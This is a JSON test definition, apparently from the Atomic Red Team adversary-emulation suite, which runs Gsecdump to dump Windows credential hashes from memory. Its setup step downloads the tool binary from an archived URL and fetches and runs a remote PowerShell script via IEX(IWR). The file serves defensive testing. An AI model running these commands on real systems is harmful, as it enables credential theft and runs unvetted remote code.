@@ -1,0 +1,98 @@
+{
+  "id": "96345bfc-8ae7-4b6a-80b7-223200f24ef9",
+  "name": "Gsecdump",
+  "description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's followed by two 32 character hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "132f95af-f520-42b9-8a0f-fda25bd5aa0a",
+      "type": "execute-command",
+      "data": {
+        "command": "\"#{gsecdump_exe}\" -a\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6b90a01f-1fc4-4d63-b6fc-af3ee521e0bb",
+      "name": "Check dependency 1/1",
+      "description": "Gsecdump must exist on disk at specified location (#{gsecdump_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{gsecdump_exe}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f1265680-f939-42a1-baf0-b26f2ea77686",
+      "name": "Resolve dependency 1/1",
+      "description": "Gsecdump must exist on disk at specified location (#{gsecdump_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n$parentpath = Split-Path \"#{gsecdump_exe}\"; $binpath = \"$parentpath\\gsecdump-v2b5.exe\"\nIEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1\" -UseBasicParsing)\nif(Invoke-WebRequestVerifyHash \"#{gsecdump_url}\" \"$binpath\" #{gsecdump_bin_hash}){\n  Move-Item $binpath \"#{gsecdump_exe}\"\n}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "80e5ca6d-e46b-4639-9286-1e2e191b537f",
+      "name": "Re-check dependency 1/1",
+      "description": "Gsecdump must exist on disk at specified location (#{gsecdump_exe})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{gsecdump_exe}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "6b90a01f-1fc4-4d63-b6fc-af3ee521e0bb",
+      "p": "on-success",
+      "o": "132f95af-f520-42b9-8a0f-fda25bd5aa0a"
+    },
+    {
+      "s": "6b90a01f-1fc4-4d63-b6fc-af3ee521e0bb",
+      "p": "on-failure",
+      "o": "f1265680-f939-42a1-baf0-b26f2ea77686"
+    },
+    {
+      "s": "f1265680-f939-42a1-baf0-b26f2ea77686",
+      "p": "on-success",
+      "o": "80e5ca6d-e46b-4639-9286-1e2e191b537f"
+    },
+    {
+      "s": "80e5ca6d-e46b-4639-9286-1e2e191b537f",
+      "p": "on-failure",
+      "o": "132f95af-f520-42b9-8a0f-fda25bd5aa0a"
+    }
+  ],
+  "tags": [
+    "T1003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "gsecdump_exe",
+      "type": "path",
+      "description": "Path to the Gsecdump executable",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\gsecdump.exe"
+    },
+    {
+      "name": "gsecdump_bin_hash",
+      "type": "string",
+      "description": "File hash of the Gsecdump binary file",
+      "value": "94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC"
+    },
+    {
+      "name": "gsecdump_url",
+      "type": "url",
+      "description": "Path to download Gsecdump binary file",
+      "value": "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe"
+    }
+  ]
+}
